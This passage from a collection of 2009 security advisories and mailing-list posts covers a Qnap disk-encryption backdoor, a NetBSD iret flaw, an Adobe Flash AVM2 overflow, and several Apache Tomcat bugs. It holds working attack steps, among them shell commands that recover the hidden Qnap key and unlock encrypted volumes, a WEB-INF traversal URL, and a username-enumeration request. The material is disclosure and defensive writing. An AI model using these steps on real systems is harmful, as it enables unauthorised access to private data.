unlock the hard disk by supplying the encryption passphrase via
the web GUI.
However, when the hard disk is encrypted, a secondary key is
created, added to the keyring, and stored in the flash with minor
obfuscation.
Impact:
The encrypted hard disk can be unlocked and potential sensitive
contents access by attackers who obtain physical or network
access to the hard disk and flash.
Description:
When a user selects in the web GUI to encrypt a hard drive, he
has to supply a passphrase of 8-16 length.
The Qnap solution is to use the underlying Linux standard
mechanisms of LUKS to create the encrypted partition.
The user supplied passphrase is crypt(3)'ed with the MD5 salt
of $1$YCCaQNAP$ and used as the initial key to access the LUKS
master key for the drive.
Additionally, the system creates a second key, which is 32
characters long and contains all low case characters and the
numbers 0-9, and adds it to the LUKS keyring:
/sbin/cryptsetup luksAddKey /dev/md0 /tmp/temp.wLbZNp
--key-file=/tmp/temp.rUBxFo
Before writing the second key to the flash, the key is then
obfuscated in the following way:
the first six characters are reversed and written to the end
of the string.
The obfuscated string is then written to the flash (/dev/sdx6
on current Qnap storage devices) in the ENCK variable.
Exploit:
An attacker - or user who has lost his passphrase - just needs
to do the following:
1. Obtain the backdoor key from the flash:
# strings /dev/sdx6 | grep ENCK
ENCK=ghijklmnopqrstuvwxyz012345fedcba
It is possible that several ENCK keys show up.
2. The key has then to be deobfuscated. The last 6 characters have
to be taken, reversed, and put in front of the string:
ENCK key before: ghijklmnopqrstuvwxyz012345fedcba
ENCK key after: abcdefghijklmnopqrstuvwxyz012345
3. The key file has to be created:
# echo -n ""abcdefghijklmnopqrstuvwxyz012345"" > /tmp/key
4. The encrypted volume is unlocked and mounted. The device is
usually /dev/md0 or /dev/sda3.
# /sbin/cryptsetup luksOpen /dev/md0 md0 --key-file=/tmp/key
key slot 0 unlocked.
Command successful.
# mount /dev/mapper/md0 /share/MD0_DATA
Full access to the encrypted volume has been obtained.
Additional Weaknesses:
The backdoor key is generated by rand() calls. As the rand()
function produces random numbers unsuitable for cryptographic
keys. The cryptographic strength of this generated key is
approx 2^32, hence feasible for breaking. This would make
access to the flash unnecessary.
The LUKS partition is created in AES-256 in plain CBC mode. This
mode is susceptible to watermark attacks.
Solution:
No fix is available from the vendor yet and scheduled for the
following month.
The official company statement is:
""The security notice from Baseline Security was received by Qnap
on the 16th September 2009 and rated as important.
Currently, a new and enhanced firmware version is already in
testing. An update is planned for the following month""
As this was implemented on purpose by the vendor, and feedback
from the taiwanese development team was scarce, it was decided
to publish the information to put public pressure on the company
to ensure not only supplying a quick update, but also announcing
the issue properly so users see the need for installed the
coming imporant firmware update.
It was proposed to the vendor to remove the key from the keyring
as described in the workaround section.
Additionally the ENCK values in the flash should be overwritten.
Once a firmware update is available, it will be tested that it
removes the crypto backdoor.
Watch the advisory URL for updates:
http://www.baseline-security.de/downloads/BSC-Qnap_Crypto_Backdoor-CVE-2009-3200.txt
Workaround:
There is no workaround available which can be used by a novice
user.
The best solution is to remove the backdoor key from keyslot 0.
However this requires hashing the user passphrase. For this, a
Linux system has to be available, which has the ""mkpasswd"" command
installed (whois package).
Execute:
# mkpasswd --hash=md5 --salt='YCCaQNAP'
and enter the password on the Password: prompt. Copy the outout.
On the Qnap device, create the keyfile with the password hash:
# echo -n ""...the output of mkpasswd..."" > /tmp/mykey
Now remove the backdoor key:
# /sbin/cryptsetup luksKillSlot /dev/md0 0 --key-file=/tmp/mykey
Remove all sensitive data, wipe the shell history, and logoff:
# echo ""aaaaaaaaaaaaaaaaaaaaaaaaaaaa"" > /tmp/mykey
# rm /tmp/mykey /tmp/key
# HISTSIZE=0
# exit
As an additional measure, the flash can be edited and the saved
key overwritten (this requires the ipkg package installed).
Install a hex editor, run the hexeditor on the flash, and
overwrite ENCK values:
# ipkg install hexcurse
# hexcurse /dev/sdx6
(a hex editor window is loading)
Type Control-F, then 454e434b and hit Enter.
Use the cursor keys to the character string after the ""ENCK=""
string and then type in as many ""A"" characters, until the string
is full. Type Control-S to save, adn Control-Q to quit.
Please note that no liability is given whatsoever by anyone
if the workaround is used. It is recommended to be performed
by experienced users only.
Original Vendor FUD:
""The functionality for encryption the hard disk does not include
a crypto backdoor.""
(in response to a user question why two keyslots are allocated,
and if this is because of a backdoor)
http://forum.qnap.com/viewtopic.php?f=11&t=11214&start=20#p63346
http://forum.qnap.com/viewtopic.php?f=12&t=12104&start=10#p63341
________________________________________________________________________
Credit:
Analysis performed thanks to the ultimate binary analysis tool
BinNavi by Zynamics, and the great - and free - IDA Pro
Dissassembler 4.9 by Datarescue.
Greets to the teams at Red Database Security, Recurity Labs,
THC and n.runs.
________________________________________________________________________
Vendor communication:
10 September 2009 Issue posted in the Qnap support forum
15 September 2009 Notification on crypto backdoor sent directly
to Qnap to force a response, giving 72 hours
to explain why the backdoor exists, when and
how it will be removed, and how this
information will be made available to the users.
15 September 2009 Qnap support contact confirms notification,
and informs of forwarding to support team
in Taiwan for clarification
16 September 2009 Phone cann from Qnap representive, stating
this issue is a high priority
18 September 2009 No statement from Qnap was given on why the
backdoor exists and if and when it will be
removed.
18 September 2009 This advisory is released
________________________________________________________________________
Contact:
mh baseline-security de
Baseline Security Consulting
http://www.baseline-security.de
________________________________________________________________________
The information provided is released ""as is"" without warranty of
any kind. The publisher disclaims all warranties, either express or
implied, including all warranties of merchantability.
No responsibility is taken for the correctness of this information.
In no event shall the publisher be liable for any damages whatsoever
including direct, indirect, incidental, consequential, loss of
business profits or special damages, even if the publisher has been
advised of the possibility of such damages.
The contents of this advisory is copyright (c) 2009 by Marc Heuse
and may be distributed freely provided that no fee is charged for
the distribution and proper credit is given.
________________________________________________________________________
--
Marc Heuse
Mobil: +49 177 9611560
Fax: +49 30 28097468
www.baseline-security.de
Baseline Security Consulting
Chausseestr. 15
10115 Berlin
Ust.-Ident.-Nr.: DE244222388
PGP: D069 301E B401 828C 4E72 0BEA D9C9 6088 36F2 A05E"
17254,Iret #GP on pre-commit handling failure: the NetBSD case (CVE-2009-2793),,CVE-2009-2793,"Iret #GP on pre-commit handling failure: the NetBSD case (CVE-2009-2793)
------------------------------------------------------------------------
On the Intel architecture, once an operating system kernel has completed
servicing an interrupt or exception, it will generally return to user
mode using iret. The iret instruction will restore the context required
to continue execution, such as code segment, instruction pointer, flags
and so on.
iret is a complex instruction whose pseudocode alone spans several pages
of the software developers manual. Interestingly, in protected mode it
is executed in two distinct stages, a pre-commit stage (before privilege
level is changed) and a post-commit stage (after privilege level is
changed). You can see the commit point in the pseudocode below (taken
from Intel manual, comment is ours)
IF new mode != 64-Bit Mode
THEN
IF tempEIP is not within code segment limits
THEN #GP(0); FI;
EIP <- tempEIP;
ELSE (* new mode = 64-bit mode *)
IF tempRIP is non-canonical
THEN #GP(0); FI;
RIP <- tempRIP;
FI;
CS <- tempCS; // This is the commit point (privilege switch)
EFLAGS (CF, PF, AF, ZF, SF, TF, DF, OF, NT) <- tempEFLAGS;
When the processor handles an exception, two cases can arise:
- the handler procedure is executed at the same level of privilege
as the interrupted procedure, no stack switch occurs
- the handler procedure is executed at a different privilege level,
therefore a stack switch occurs
The generated stack frame will be different if a stack switch occurs,
because the processor needs to save the interrupted procedure's stack.
When iret returns to a different privilege level, its behaviour on
failure will depend on which stage of the operation it is currently
executing. A pre-commit failure will induce no stack-switching while a
post-commit failure will induce a stack switching and therefore generate
a different size trap frame.
--------------------
Affected Software
------------------------
It's easy to overlook this distinction and we have found multiple cases
where this has had direct security consequences or made other issues
exploitable.
For instance, the NetBSD kernel on x86 does not handle pre-commit failures
properly.
We can easily make iret fail pre-commit by having tempEIP outside the
code segment limits.
- The canonical way to do this is to set-up a LDT entry with a code segment
limited to 0x1FFF. mmap memory at 0x1000 and then put some shellcode with
an int 0x80 at the very end of this page, so that when the kernel iret,
tempEIP is past the code segment limits.
- Interestingly, because of the lazy handling of non executable stack
emulation on x86, this bug could be triggered by a non malicious
program:
/* ... */
int main(int argc, char **argv)
{
jmp_buf env;
void handlesig(int n) {
longjmp(env, 1);
}
signal(SIGSEGV, handlesig);
if (setjmp(env) == 0) {
( (void(*)(void)) NULL) ();
}
return 0;
}
/* ... */
int main(int argc, char **argv)
{
char baguette;
signal(SIGABRT, (void (*)(int))&baguette);
abort();
}
--------------------
Consequences
-----------------------
In the NetBSD case, the kernel stack will get desynchronized. This might
allow an attacker to elevate privileges.
-------------------
Solution
-----------------------
We reported this to NetBSD developpers in May. Obviously, the fix is
non trivial, and after much discussion, we agreed to release this
information to open this issue to the wider NetBSD developement
community.
-------------------
Credit
-----------------------
This bug was discovered by Tavis Ormandy and Julien Tinnes of the Google
Security Team."
17595,Advisory: Adobe Flash Player and AIR AVM2 intf_count Integer Overflow Remote Code Execution (CVE-2009-1869),,CVE-2009-1869,"Background:
==========
ActionScript code is compiled into ActionScript Byte Code segments,
loaded by AVM2 (ActionScript Virtual Machine 2).
These segments are described by the abcFile structure:
abcFile
{
u16 minor_version
u16 major_version
cpool_info constant_pool
u30 method_count
method_info method[method_count]
u30 metadata_count
metadata_info metadata[metadata_count]
u30 class_count
instance_info instance[class_count]
class_info class[class_count]
u30 script_count
script_info script[script_count]
u30 method_body_count
method_body_info method_body[method_body_count]
}
The value of class_count element is the number of entries in the
instance and class arrays.
Each instance entry is a variable length instance_info structure which
specifies the
characteristics of object instances created by a particular class:
instance_info
{
u30 name
u30 super_name
u8 flags
u30 protectedNs
u30 intrf_count
u30 interface[intrf_count]
u30 iinit
u30 trait_count
traits_info trait[trait_count]
}
The value of the intrf_count field is the number of entries in the
interface array.
The interface array contains indices into the multiname array of the
constant pool;
the referenced names specify the interfaces implemented by this class.
Vulnerability:
=============
An integer overflow exists in the AVM2 abcFile parser code which handles the
intrf_count value of the instance_info structure.
When intrf_count is larger than 0x10000000, it is nullified due to an
integer overflow.
This results in an out of bounds pointer dereference. The out of
bounds object contains
arbitrary values (in the context of the code which handles the
interfaces count element)
which are manipulated in a way so that an arbitrary memory overwrite
with an attacker
supplied destination and value is possible.
The following is a detailed run trace which explains the
vulnerability. Irrelevant
instructions are omitted. Flash10b.ocx is assumed to be loaded at VA 10000000h.
let <intrf_count> be 0x10000000
.text:10206B03 mov edi, [esp+50h+var_2C] ; EDI=<intrf_count>=0x10000000
.text:10206B14 lea edx, [edi+edi] ;
EDX=<intrf_count*2>=0x20000000, may not overflow (verified elsewhere)
.text:10206B1B call sub_101EAC30
.text:101EAC45 call sub_101EAB90
.text:101EAB98 call sub_101D1FF0 ; this method calculates
the nearest power of 2 for <intrf_count*2> (i.e: stays 0x20000000)
.text:101EABA0 add eax, eax ; doubles that value (i.e:
EAX=0x40000000)
.text:101EABCC lea ecx, ds:0[eax*4] ; multiplies it by 4 (i.e:
ECX=0x00000000) =>OVERFLOW<=
.text:101EABDA call sub_10224C62
.text:10224C62 jmp sub_10224363
.text:10224363 mov edx, [esp+arg_0] ; arg_0 is the overflown
value (i.e: EDX=00000000)
.text:10224367 lea eax, [edx+7]
.text:10224376 and eax, 0FFFFFFF8h ; EAX=00000000
.text:1022437A mov esi, eax ; ESI=00000000
.text:102243A4 mov ecx, esi ; ECX=00000000
.text:102243A9 mov eax, [eax+ecx*4-4]
; the overflown value is used as an index into pointer table, starting at EAX.
; since we can cause ECX to become 0x0000000, we may select an out of bounds
; pointer (eax-4). Tests show that it always contains a valid pointer to some
; object, with arbitrary values. i.e: EAX=&OutOfBoundsObject
.text:102243AD mov ecx, eax ; ECX=&OutOfBoundsObject
.text:102243C8 call sub_10226D4D
.text:10226D53 mov ebx, ecx ; EBX=&OutOfBoundsObject
.text:10226D6C mov esi, [ebx+8] ; ESI=&ArbitraryObjectA
(usually: 0x55555555)
.text:10226D76 test byte ptr [esi+2Ah], 1 ; <PathConditionA >-
must pass this in order to continue
.text:10226D7A jz short loc_10226DA5
.text:10226D7C mov eax, [ebx+38h] ;
EAX=&ArbitraryObjectB, (usually 0x55555557)
.text:10226D7F cmp byte ptr [eax+33Ch], 0 ; <PathConditionB> -
must pass this in order to continue
.text:10226D86 mov ecx, ebx ; ECX=&OutOfBoundsObject
.text:10226D88 jnz short loc_10226D9D
.text:10226D8A push esi
.text:10226D8B call sub_10226CAF
.text:10226CB0 mov esi, [esp+4+arg_0] ;
ESI=&ArbitraryObjectA, (usually 0x55555555)
.text:10226CB5 push esi
.text:10226CB6 mov edi, ecx ; EDI=&OutOfBoundsObject
.text:10226CB8 call sub_102266CA
.text:102266CA mov eax, [esp+arg_0] ;
EAX=ESI=&ArbitraryObjectA (usually 0x55555555)
.text:102266DB mov ecx, [eax+1Ch] ; ECX=arbitrary value
- usually *(0x55555571)
.text:102266CE mov edx, [eax+20h] ; EDX=arbitrary value
- usually *(0x55555575)
.text:102266DE mov [ecx+20h], edx; ; JACKPOT - a write of
an arbitrary DWORD to an arbitrary VA
The following is an illustration of the pointer table and the out of
bounds pointer
which may be dereferenced:
addr val
0017487C 00E82000 <- EAX-4 (ECX=0)
00174880 001681C8 <- EAX (ECX=1)
00174884 00174AC8
00174888 00174BD0
0017488C 00174CD8
00174890 00174DE0
00174894 00174EE8
00174898 00174FF0
0017489C 001750F8
001748A0 00175200
001748A4 00175308
001748A8 00175410
001748AC 00175518
001748B0 00175620
001748B4 00175728
001748B8 00175830
001748BC 00175938
001748C0 00175A40
001748C4 00175B48
001748C8 00175C50
001748CC 00175D58
The following is a memory dump of the out of bounds object:
00E82000 44 51 55 55 55 45 55 75 55 55 55 55 55 55 55 55
00E82010 55 55 55 55 55 55 55 54 55 55 55 55 01 00 00 00
00E82020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50
00E82030 55 55 55 55 D5 55 55 55 57 55 55 55 55 55 55 55
00E82040 D5 5A 55 55 54 55 55 55 55 55 55 55 75 B5 56 55
00E82050 55 55 55 55 15 55 55 D5 55 55 AD 55 77 D5 55 55
00E82060 55 55 55 55 D5 D5 BA 56 55 55 55 55 55 55 6B 55
00E82070 B5 56 55 55 57 55 55 01 00 00 00 00 00 00 00 00
00E82080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00E82090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00E820A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00E820B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00E820C0 00 00 00 00 00 00 00 00 00 00
To make things more clear:
Let 'ArbitraryObjectA' be pointed by (&OutOfBoundsObject+0x8)
Let 'ArbitraryObjectB' be pointed by (&OutOfBoundsObject+0x38)
In order to reach the arbitrary overwrite, the are three conditions
1) intrf_count >= 0x10000000 // in order to overflow
2) PathConditionA: ((char *)ArbitraryObjectA)[0x2e] == 1 //
.text:10226D76
3) PathConditionB: ((char *)ArbitraryObjectB)[0x33c] == 0 //
.text:10226D7F
Given the conditions are passed, a memory DWORD overwrite of
arbitrary target and value occurs:
*(DWORD *)((*(DWORD *)(ArbitraryObjectA+0x1c))+0x20) = *(DWORD
*)(ArbitraryObjectA+0x20)
Exploitation:
=============
Since the out of bounds object contains arbitrary values, the attacker
may spray the heap
so he/she would have control over ArbitraryObjectA and
ArbitraryObjectB (they would
be located at addresses which contain data controlled by the
attacker). This may allow him/her
to pass all aforementioned conditions and also control the value which
is written
in the arbitrary memory MOV and the target of it. Achieving this may
allow him the execute arbitrary code.
During the research of this vulnerability I’ve managed to create a
functional exploit
(URL of the demo can be found in the references section of this advisory)
It should be denoted that the vulnerable code is wrapped by an SEH
handler which doesn't
crash the application on Access Violation. This means that the
exploitation process may
try different base addresses and offsets in case of a failure.
Attack vector:
==============
Lure the victim to open a malicious SWF file
Impact:
=======
Remote Code Execution
Test Environment:
=================
1. Adobe Flash Player 10.0.22.87
2. Windows XP SP3.
Remediation:
=========
New versions of Adobe Flash Player (10.0.32.18) and AIR (1.5.2) have
been released in order to address this vulnerability.
Identifiers:
============
1. CVE-ID: CVE-2009-1869
2. BID: 35907
Remarks:
============
I would like to thank Adobe for the efficient way in which they
handled this security issue.
References:
===========
1. My Blog (contains the original advisory): http://roeehay.blogspot.com/
2. Demo of the exploit: http://www.youtube.com/watch?v=wJb6a-J3i4c
3. Adobe’s advisory:
http://www.adobe.com/support/security/bulletins/apsb09-10.html"
17693,"Need information, for MPlayer demux_open_vqf TwinVQ File Handling Buffer Overflow CVE-2008-5616",,CVE-2008-5616,"Hi All
I am in need of some Information for the below mentioned Vulnerability.
CVE-2008-5616
MPlayer demux_open_vqf TwinVQ File Handling Buffer Overflow
Description:
MPlayer contains a stack buffer overflow vulnerability while parsing
malformed TwinVQ media files, where TwinVQ (transform-domain weighted
interleaved vector quantization) is an audio compression technique
developed by Nippon Telegraph and Telephone Corporation (NTT). The
vulnerability may be exploited by the remote attacker to execute
arbitrary code in the context of MPlayer. The vulnerable function is
demux_open_vqf() and the vulnerable parameters are Chunk Size of COMM
chunk, and Tag Length of any tag within it. The vulnerable programs
are mplayer, gmplayer and mencoder on Linux-based systems.
Mplayer.exe, gmplayer.exe and mencoder.exe on Windows-based systems.
This issue affects MPlayer 1.0rc2, other versions may also be
affected.
Vulnerability Analysis
* TwinVQ (transform-domain weighted interleaved vector quantization)
is an audio compression technique developed by Nippon Telegraph and
Telephone Corporation (NTT).
* MPlayer contains a stack buffer overflow vulnerability while parsing
malformed TwinVQ media files.
* TWIN constant expression for TWINVQ is always followed by 8 digits
version number
* COMM is the Standard Sub-chunk will fall after 4 byte size relative
to TWIN pattern.
* Data_size from DSIZ subchunk unsigned value is having vulnerability.
* In the malicious packet i analyze, The sub-chunk size is around 8191
bytes ( 0x 00 00 1f ff).
But as per the file format all these sub-chunk fields are very small.
Even if all these sub-chunks
are present, I didn't see that is exceed not more than say around 300-400 bytes.
So can i conclude that If the sub-chunk size is more than the above
mentioned value, we can trigger an
alert.
Please help me out in the above mentioned issue
Thanks & Regards
Uthraa
uthraa.c freescale com"
17924,Re: CVE-2009-1151: phpMyAdmin Remote Code Execution Proof of Concept,,CVE-2009-1151,"Poc for Static code injection vulnerability in setup.php in phpMyAdmin.
http://www.milw0rm.com/exploits/8921
Best Regards
-Rajesh Kumar"
17981,[SECURITY] UPDATED CVE-2008-5515 RequestDispatcher directory traversal vulnerability,,CVE-2008-5515,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Updated to add additional patches required for 5.5.x and 4.1.x
CVE-2008-5515: Apache Tomcat information disclosure vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.0 to 4.1.39
Tomcat 5.5.0 to 5.5.27
Tomcat 6.0.0 to 6.0.18
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected
Description:
When using a RequestDispatcher obtained from the Request, the target
path was normalised before the query string was removed. A request that
included a specially crafted request parameter could be used to access
content that would otherwise be protected by a security constraint or by
locating it in under the WEB-INF directory.
Mitigation:
6.0.x users should upgrade to 6.0.20 or apply this patch:
http://svn.apache.org/viewvc?view=rev&revision=734734
5.5.x users should upgrade to 5.5.28 when released or apply these patches:
http://svn.apache.org/viewvc?view=rev&revision=782757
http://svn.apache.org/viewvc?view=rev&revision=783291
4.1.x users should upgrade to 4.1.40 when released or apply these patches:
http://svn.apache.org/viewvc?view=rev&revision=782763
http://svn.apache.org/viewvc?view=rev&revision=783292
Example:
For a page that contains:
<%
request.getRequestDispatcher( ""bar.jsp?somepar=someval&par="" +
request.getParameter( ""blah"" ) ).forward( request, response );
%>
an attacker can use:
http://host/page.jsp?blah=/../WEB-INF/web.xml
Credit:
This issue was discovered by Iida Minehiko, Fujitsu Limited
References:
http://tomcat.apache.org/security.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkovmMwACgkQb7IeiTPGAkNPigCcDBEKxwuBoXnvixbqoqM8CIaN
VKYAni4kHySG2JmbYi1hz4xAGpgm36Gr
=7FT9
-----END PGP SIGNATURE-----"
17997,CVE-2009-1151: phpMyAdmin Remote Code Execution Proof of Concept,,CVE-2009-1151,"I couldn’t find any public PoC for this phpMyAdmin vulnerability, so I
wrote one:
http://www.gnucitizen.org/blog/cve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept/"
18010,[SECURITY] CVE-2008-5515 RequestDispatcher directory traversal vulnerability,,CVE-2008-5515,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-5515: Apache Tomcat information disclosure vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.0 to 4.1.39
Tomcat 5.5.0 to 5.5.27
Tomcat 6.0.0 to 6.0.18
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected
Description:
When using a RequestDispatcher obtained from the Request, the target
path was normalised before the query string was removed. A request that
included a specially crafted request parameter could be used to access
content that would otherwise be protected by a security constraint or by
locating it in under the WEB-INF directory.
Mitigation:
6.0.x users should upgrade to 6.0.20 or apply this patch:
http://svn.apache.org/viewvc?view=rev&revision=734734
5.5.x users should upgrade to 5.5.28 when released or apply this patch:
http://svn.apache.org/viewvc?view=rev&revision=782757
4.1.x users should upgrade to 4.1.40 when released or apply this patch:
http://svn.apache.org/viewvc?view=rev&revision=782763
Example:
For a page that contains:
<%
request.getRequestDispatcher( ""bar.jsp?somepar=someval&par="" +
request.getParameter( ""blah"" ) ).forward( request, response );
%>
an attacker can use:
http://host/page.jsp?blah=/../WEB-INF/web.xml
Credit:
This issue was discovered by Iida Minehiko, Fujitsu Limited
References:
http://tomcat.apache.org/security.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkotiBQACgkQb7IeiTPGAkMi6QCgnlzEt/7byUJo2YXGHMLj2ckH
rF8AoK8dmpZcxd5pV9VvEaPqm4xhXJPO
=bDV5
-----END PGP SIGNATURE-----"
18027,[SECURITY] CVE-2009-0580 UPDATED Apache Tomcat User enumeration vulnerability with FORM authentication,,CVE-2009-0580,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Updated to clarify affected versions as they vary for each affected Realm.
CVE-2009-0580: Tomcat information disclosure vulnerability
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
MemoryRealm:
Tomcat 4.1.0 to 4.1.39
Tomcat 5.5.0 to 5.5.27
Tomcat 6.0.0 to 6.0.18
DataSourceRealm:
Tomcat 4.1.17 to 4.1.31
Tomcat 5.5.0 to 5.5.5
JDBCRealm:
Tomcat 4.1.0 to 4.1.31
Tomcat 5.5.0 to 5.5.5
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected.
Description:
Due to insufficient error checking in some authentication classes,
Tomcat allows for the enumeration (brute force testing) of usernames by
supplying illegally URL encoded passwords. The attack is possible if
form based authenticiaton (j_security_check) with one of the following
authentication realms is used:
* MemoryRealm
* DataSourceRealm
* JDBCRealm
Mitigation:
6.0.x users should do one of the following:
- upgrade to 6.0.20
- apply this patch http://svn.apache.org/viewvc?rev=747840&view=rev
5.5.x users should do one of the following:
- upgrade to 5.5.28 when released
- apply this patch http://svn.apache.org/viewvc?rev=781379&view=rev
4.1.x users should do one of the following:
- upgrade to 4.1.40 when released
- apply this patch http://svn.apache.org/viewvc?rev=781382&view=rev
Example:
The following POST request should trigger an error (500 server error or
empty response, depending on the configuration) if the ROOT web
application is configured to use FORM authentication:
POST /j_security_check HTTP/1.1
Host: localhost
j_username=tomcat&j_password=%
Credit:
This issue was discovered by D. Matscheko and T. Hackner of SEC Consult.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkoo/a0ACgkQb7IeiTPGAkOwBgCgg32bOh5/3FWwmg+qnazFuJLy
UGAAnjGl3psau6THn7UDBjpHfSG8LZ4a
=SIJ6
-----END PGP SIGNATURE-----"
18037,Re: [SECURITY] CVE-2009-0580 Apache Tomcat User enumeration vulnerability with FORM authentication,,CVE-2009-0580,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Mark,
On 6/3/2009 11:42 AM, Mark Thomas wrote:
> CVE-2009-0580: Tomcat information disclosure vulnerability
I know I'm likely to get a vague response, but could you provide some
more info about this issue?
> Due to insufficient error checking in some authentication classes,
> Tomcat allows for the enumeration (brute force testing) of usernames by
> supplying illegally URL encoded passwords.
[snip]
> j_username=tomcat&j_password=%
I'm not sure how the patch (I read the patch for TC5.5
DataSourceRealm.java) changes anything at all: it appears to be merely a
performance optimization.
No changes are made to the behavior of Tomcat, since the same null is
returned to the caller if the credentials do not match.
I don't see any information disclosure vulnerability in the first place,
and I don't see how your patch would have fixed it.
??!
- -chris
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iEYEARECAAYFAkon+tMACgkQ9CaO5/Lv0PCd5ACfcBAJjcKnjKjDgChIezhr8Oty
MkQAoKUVc0ynWGvtp0Wf4S42Jeytxwwk
=iKFX
-----END PGP SIGNATURE-----"
18038,[SECURITY] CVE-2009-0783 Apache Tomcat Information disclosure,,CVE-2009-0783,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-0783: Apache Tomcat information disclosure vulnerability
Severity: low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 6.0.0 to 6.0.18
Tomcat 5.5.0 to 5.5.27
Tomcat 4.1.0 to 4.1.39
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected.
Description:
Bugs https://issues.apache.org/bugzilla/show_bug.cgi?id=29936 and
https://issues.apache.org/bugzilla/show_bug.cgi?id=45933 allowed a web
application to replace the XML parser used by Tomcat to process web.xml,
context.xml and tld files. If a web application is the first web
application loaded, these bugs allow that web application to potentially
view and/or alter the web.xml, context.xml and tld files of other web
applications deployed on the Tomcat instance.
Mitigation:
6.0.x users should do one of the following:
- upgrade to 6.0.20
- apply these patches
- http://svn.apache.org/viewvc?rev=739522&view=rev
- http://svn.apache.org/viewvc?rev=652592&view=rev
5.5.x users should do one of the following:
- upgrade to 5.5.28 when released
- apply these patches
- http://svn.apache.org/viewvc?rev=781542&view=rev
- http://svn.apache.org/viewvc?rev=681156&view=rev
4.1.x users should do one of the following:
- upgrade to 4.1.40 when released
- apply this patch http://svn.apache.org/viewvc?rev=781708&view=rev
Example:
See https://issues.apache.org/bugzilla/show_bug.cgi?id=29936#c12 for an
example web application that can be used to replace the XML parser used
by Tomcat.
Credit:
The security implications of these bugs was discovered and reported to
the Apache Software Foundation by Philippe Prados.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
http://tomcat.apache.org/security-4.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkonw6EACgkQb7IeiTPGAkM8qACgyxH+hBK4r4DprZhIqd97x/V1
/7EAnRMaJsKIoPzBQgOtOhM3vOCtyL+F
=B+Gu
-----END PGP SIGNATURE-----"
18045,[SECURITY] CVE-2009-0033 Apache Tomcat DoS when using Java AJP connector,,CVE-2009-0033,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-0033: Apache Tomcat denial of service vulnerability
Severity: important
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 6.0.0 to 6.0.18
Tomcat 5.5.0 to 5.5.27
Tomcat 4.1.0 to 4.1.39
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected.
Description:
If Tomcat receives a request with invalid headers via the Java AJP
connector, it does not return an error and instead closes the AJP
connection. In case this connector is member of a mod_jk load balancing
worker, this member will be put into an error state and will be blocked
from use for approximately one minute. Thus the behaviour can be used
for a denial of service attack using a carefully crafted request.
Mitigation:
6.0.x users should do one of the following:
- upgrade to 6.0.20
- apply this patch http://svn.apache.org/viewvc?rev=742915&view=rev
5.5.x users should do one of the following:
- upgrade to 5.5.28 when released
- apply this patch http://svn.apache.org/viewvc?rev=781362&view=rev
4.1.x users should do one of the following:
- upgrade to 4.1.40 when released
- apply this patch http://svn.apache.org/viewvc?rev=781362&view=rev
Example:
GET /servlets-examples/ HTTP/1.1
Host: localhost:x
Credit:
This issue was discovered by Yoshihito Fukuyama.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
http://tomcat.apache.org/security-4.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkommc4ACgkQb7IeiTPGAkNJNACePbuHUz9m9P/lR/+hfhXh4TpL
V+EAnRjaiXwAkLJROzGDQebAqyNchEJt
=OHhB
-----END PGP SIGNATURE-----"
18046,[SECURITY] CVE-2009-0580 Apache Tomcat User enumeration vulnerability with FORM authentication,,CVE-2009-0580,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-0580: Tomcat information disclosure vulnerability
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.0 to 4.1.39
Tomcat 5.5.0 to 5.5.27
Tomcat 6.0.0 to 6.0.18
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected.
Description:
Due to insufficient error checking in some authentication classes,
Tomcat allows for the enumeration (brute force testing) of usernames by
supplying illegally URL encoded passwords. The attack is possible if
form based authenticiaton (j_security_check) with one of the following
authentication realms is used:
* MemoryRealm
* DataSourceRealm
* JDBCRealm
Mitigation:
6.0.x users should do one of the following:
- upgrade to 6.0.20
